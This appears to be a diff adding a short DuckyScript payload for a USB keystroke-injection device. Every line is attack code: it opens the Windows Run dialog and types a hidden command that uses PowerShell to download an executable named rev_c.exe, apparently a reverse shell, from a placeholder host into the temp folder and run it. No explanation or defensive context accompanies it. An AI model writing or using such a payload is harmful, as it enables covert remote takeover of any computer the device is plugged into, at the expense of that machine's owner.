@@ -1,0 +1,4 @@
+GUI R
+DELAY 2000
+STRING cmd /C "start /MIN cmd /C powershell Invoke-WebRequest -Uri http://YOUR-URL/rev_c.exe -OutFile $env:temp/rev_c.exe ; Start-Process $env:temp/rev_c.exe"
+ENTER
